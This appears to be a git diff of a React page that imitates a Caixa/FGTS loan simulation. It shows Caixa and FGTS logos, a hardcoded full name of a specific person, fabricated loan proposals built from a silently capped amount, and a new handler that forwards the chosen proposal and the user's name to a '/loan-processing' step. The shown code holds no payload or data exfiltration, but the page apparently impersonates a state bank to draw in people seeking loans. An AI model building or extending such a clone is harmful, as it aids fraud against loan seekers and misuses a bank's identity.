@@ -1,4 +1,3 @@
-
 import React, { useState } from 'react';
 import { ArrowRight, DollarSign, BarChart3, Calendar, Home, HelpCircle, MoreHorizontal, Check, Info } from 'lucide-react';
 import CaixaLogo from '@/components/CaixaLogo';
@@ -29,7 +28,6 @@ const LoanDetails = () => {
   const [hasConsulted, setHasConsulted] = useState(false);
   const [userName, setUserName] = useState('JUAREZ JOSE FERNANDES DE FREITAS');
   
-  // Monthly interest rate of 1.8%
   const monthlyInterestRate = 0.018;
   
   const [loanProposals, setLoanProposals] = useState<LoanProposal[]>([]);
@@ -59,25 +57,20 @@ const LoanDetails = () => {
   const handleConsult = () => {
     if (!requestedAmount || !desiredInstallment) return;
     
-    // Limit the loan amount to around 10,000 reais
     const requestedAmountValue = parseFloat(requestedAmount.replace(/\./g, '').replace(',', '.'));
     const maxLoanAmount = 10000;
     
-    // Use the requested amount but cap it at 10,000
     const amount = Math.min(requestedAmountValue, maxLoanAmount);
     
-    // If the user requested more than the max, we can show a message or adjust silently
     if (requestedAmountValue > maxLoanAmount) {
-      // You could show a toast or message here if needed
       console.log("Requested amount exceeded maximum, limiting to R$ 10,000");
     }
     
     const installment = parseFloat(desiredInstallment.replace(/\./g, '').replace(',', '.'));
     
-    // Generate 3 proposals with different values
     const proposal1 = {
       id: 1,
-      totalAmount: amount * 0.95, // 5% less
+      totalAmount: amount * 0.95,
       installmentsCount: 60,
       installmentValue: (amount * 0.95 * (monthlyInterestRate * Math.pow(1 + monthlyInterestRate, 60))) / 
                         (Math.pow(1 + monthlyInterestRate, 60) - 1),
@@ -89,7 +82,7 @@ const LoanDetails = () => {
     
     const proposal2 = {
       id: 2,
-      totalAmount: amount * 1.10, // 10% more
+      totalAmount: amount * 1.10,
       installmentsCount: 60,
       installmentValue: (amount * 1.10 * (monthlyInterestRate * Math.pow(1 + monthlyInterestRate, 60))) / 
                         (Math.pow(1 + monthlyInterestRate, 60) - 1),
@@ -101,7 +94,7 @@ const LoanDetails = () => {
     
     const proposal3 = {
       id: 3,
-      totalAmount: amount * 1.23, // 23% more
+      totalAmount: amount * 1.23,
       installmentsCount: 60,
       installmentValue: (amount * 1.23 * (monthlyInterestRate * Math.pow(1 + monthlyInterestRate, 60))) / 
                         (Math.pow(1 + monthlyInterestRate, 60) - 1),
@@ -136,19 +129,22 @@ const LoanDetails = () => {
   const selectedProposal = loanProposals.find(p => p.selected) || loanProposals[0];
   
   const handleProceed = () => {
-    // Here you would handle the loan application submission
-    navigate('/dashboard');
+    const selectedProposal = loanProposals.find(p => p.selected) || loanProposals[0];
+    navigate('/loan-processing', { 
+      state: { 
+        ...selectedProposal,
+        userName
+      } 
+    });
   };
 
   return (
     <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9]">
-      {/* Header */}
       <div className="p-4 sm:p-6 flex justify-between items-center">
         <FGTSLogo className={`${isMobile ? 'h-8 w-28' : 'h-10'}`} />
         <CaixaLogo className={`${isMobile ? 'h-8 w-28' : 'h-10'}`} />
       </div>
 
-      {/* Title */}
       <div className="p-4 sm:p-6">
         <div className="text-white text-2xl font-light">Simulação de Empréstimo</div>
         <div className="text-white opacity-60 text-sm mt-1">
@@ -156,7 +152,6 @@ const LoanDetails = () => {
         </div>
       </div>
 
-      {/* Main content */}
       <div className="mt-4 flex-1 bg-white rounded-t-3xl overflow-hidden">
         <div className="p-4 sm:p-6">
           {!hasConsulted ? (
@@ -209,7 +204,6 @@ const LoanDetails = () => {
             </div>
           ) : (
             <>
-              {/* User Name Display */}
               <div className="mb-6">
                 <h2 className="text-[#005CA9] text-xl font-semibold">Olá, {userName}</h2>
                 <p className="text-gray-600 text-sm mt-1">
@@ -217,7 +211,6 @@ const LoanDetails = () => {
                 </p>
               </div>
               
-              {/* Loan proposals */}
               <div className="mb-6">
                 <h2 className="text-[#005CA9] text-lg font-semibold mb-4">Propostas Disponíveis</h2>
                 
@@ -261,7 +254,6 @@ const LoanDetails = () => {
                 </div>
               </div>
 
-              {/* Selected Loan details */}
               {selectedProposal && (
                 <div className="bg-white border border-gray-200 rounded-lg p-5 mb-6 shadow-sm">
                   <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
@@ -333,7 +325,6 @@ const LoanDetails = () => {
                 </div>
               )}
               
-              {/* Benefits */}
               <div className="mb-20">
                 <div className="text-[#005CA9] font-semibold mb-3">Vantagens</div>
                 <div className="flex items-start space-x-2 mb-2">
@@ -353,7 +344,6 @@ const LoanDetails = () => {
           )}
         </div>
         
-        {/* Bottom Navigation */}
         <div className="fixed bottom-0 w-full bg-white border-t border-gray-200">
           <div className="flex justify-around items-center py-3">
             <div className="flex flex-col items-center text-gray-500">
